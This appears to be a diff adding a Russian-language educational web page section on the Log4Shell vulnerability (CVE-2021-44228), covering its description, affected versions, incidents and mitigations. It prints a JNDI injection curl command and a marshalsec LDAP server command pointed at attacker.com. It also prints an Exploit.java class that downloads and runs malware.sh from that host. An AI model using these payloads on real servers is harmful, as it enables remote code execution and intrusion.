@@ -1,0 +1,196 @@
+<!-- Log4Shell Details -->
+<section class="py-20 bg-gray-900/50" id="log4shell">
+    <div class="container mx-auto px-4">
+        <div class="exploit-detail">
+            <div class="exploit-detail__header">
+                <div class="exploit-detail__meta">
+                    <span class="exploit-detail__year">2021</span>
+                    <span class="exploit-detail__severity exploit-detail__severity--critical">Критический</span>
+                </div>
+                <h2 class="exploit-detail__title">Log4Shell (CVE-2021-44228)</h2>
+                <p class="exploit-detail__subtitle">Уязвимость в библиотеке логирования Log4j</p>
+            </div>
+
+            <div class="exploit-detail__content">
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Описание</h3>
+                    <p>Log4Shell — это критическая уязвимость нулевого дня в библиотеке логирования Log4j, которая позволяет злоумышленникам выполнять произвольный код на уязвимых серверах. Уязвимость получила максимальную оценку 10.0 из 10 по шкале CVSS.</p>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Технические детали</h3>
+                    <p>Уязвимость возникает из-за неправильной обработки JNDI-запросов в Log4j. Атакующий может внедрить вредоносный JNDI-запрос, который будет выполнен на сервере при логировании определенных данных.</p>
+                    
+                    <div class="terminal my-6">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button red"></div>
+                            <div class="terminal-button yellow"></div>
+                            <div class="terminal-button green"></div>
+                        </div>
+                        <div class="terminal-title">bash - Эксплуатация уязвимости</div>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-prompt">
+                            <span class="terminal-prefix">attacker@kali</span>
+                            <span class="terminal-command"># Используем curl для отправки вредоносного JNDI-запроса</span>
+                        </div>
+                        <div class="terminal-prompt">
+                            <span class="terminal-prefix">$</span>
+                            <span class="terminal-command">curl -H "X-Api-Version: ${jndi:ldap://attacker.com/Exploit}" http://vulnerable-app.com</span>
+                        </div>
+                        
+                        <div class="terminal-prompt mt-6">
+                            <span class="terminal-prefix">attacker@kali</span>
+                            <span class="terminal-command"># Запускаем LDAP-сервер для обработки запроса</span>
+                        </div>
+                        <div class="terminal-prompt">
+                            <span class="terminal-prefix">$</span>
+                            <span class="terminal-command">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
+  "http://attacker.com/#Exploit" 1389</span>
+                        </div>
+                        
+                        <div class="terminal-prompt mt-6">
+                            <span class="terminal-prefix">attacker@kali</span>
+                            <span class="terminal-command"># Проверяем, что эксплойт сработал</span>
+                        </div>
+                        <div class="terminal-prompt">
+                            <span class="terminal-prefix">$</span>
+                            <span class="terminal-command">tail -f /var/log/victim-app/application.log</span>
+                        </div>
+                        <div class="terminal-output text-green-400">
+                            ... уязвимый код выполнен успешно ...
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="terminal my-8">
+                    <div class="terminal-header">
+                        <div class="terminal-buttons">
+                            <div class="terminal-button red"></div>
+                            <div class="terminal-button yellow"></div>
+                            <div class="terminal-button green"></div>
+                        </div>
+                        <div class="terminal-title">Exploit.java - Вредоносный класс</div>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-code">
+<pre><code>import java.io.IOException;
+
+public class Exploit {
+    static {
+        try {
+            // Выполняем произвольную команду на атакуемом сервере
+            String[] cmd = {"bash", "-c", 
+                "curl -s http://attacker.com/malware.sh | bash &"};
+            
+            // Альтернативный вариант для Windows
+            // String[] cmd = {"cmd.exe", "/c", "calc.exe"};
+            
+            Runtime.getRuntime().exec(cmd);
+            
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}</code></pre>
+                        </div>
+                    </div>
+                </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Пострадавшие</h3>
+                    <ul class="exploit-detail__list">
+                        <li>Log4j 2.0-beta9 до 2.14.1</li>
+                        <li>Сервисы, использующие уязвимые версии Log4j</li>
+                        <li>Крупные компании, включая Apple, Amazon, Cloudflare, Twitter и другие</li>
+                    </ul>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Известные инциденты</h3>
+                    <div class="exploit-detail__incidents">
+                        <div class="incident">
+                            <div class="incident__date">Декабрь 2021</div>
+                            <div class="incident__description">Массовые атаки на сервисы по всему миру с использованием уязвимости Log4Shell</div>
+                        </div>
+                        <div class="incident">
+                            <div class="incident__date">Январь 2022</div>
+                            <div class="incident__description">Обнаружены ботнеты, использующие уязвимость для майнинга криптовалют</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Меры защиты</h3>
+                    
+                    <div class="terminal my-6">
+                        <div class="terminal-header">
+                            <div class="terminal-buttons">
+                                <div class="terminal-button red"></div>
+                                <div class="terminal-button yellow"></div>
+                                <div class="terminal-button green"></div>
+                            </div>
+                            <div class="terminal-title">bash - Защитные меры</div>
+                        </div>
+                        <div class="terminal-body">
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command"># 1. Обновление Log4j до последней версии</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">./mvnw versions:use-latest-versions \
+  -Dincludes=org.apache.logging.log4j:*</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command"># 2. Временная мера: отключение JNDI</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command">java -Dlog4j2.formatMsgNoLookups=true -jar app.jar</span>
+                            </div>
+                            
+                            <div class="terminal-prompt mt-6">
+                                <span class="terminal-prefix">$</span>
+                                <span class="terminal-command"># 3. Блокировка исходящих подключений (Linux)</span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">#</span>
+                                <span class="terminal-command">iptables -A OUTPUT -p tcp --dport 389 -j DROP  # LDAP
+                                </span>
+                            </div>
+                            <div class="terminal-prompt">
+                                <span class="terminal-prefix">#</span>
+                                <span class="terminal-command">iptables -A OUTPUT -p tcp --dport 1389 -j DROP # LDAPS
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold mb-3">Дополнительные рекомендации:</h4>
+                        <ul class="list-disc pl-5 space-y-2 text-gray-300">
+                            <li>Включите WAF (Web Application Firewall) с правилами для обнаружения и блокировки атак Log4Shell</li>
+                            <li>Настройте мониторинг подозрительной активности в логах приложений</li>
+                            <li>Ограничьте доступ к управлению логами только доверенным пользователям</li>
+                            <li>Проводите регулярное сканирование уязвимостей в зависимостях</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="exploit-detail__section">
+                    <h3 class="exploit-detail__section-title">Дополнительные ресурсы</h3>
+                    <ul class="exploit-detail__links">
+                        <li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener noreferrer">Официальный сайт Log4j Security</a></li>
+                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener noreferrer">NVD - CVE-2021-44228</a></li>
+                        <li><a href="https://www.cisa.gov/uscert/ncas/alerts/aa21-356a" target="_blank" rel="noopener noreferrer">CISA Alert AA21-356A</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
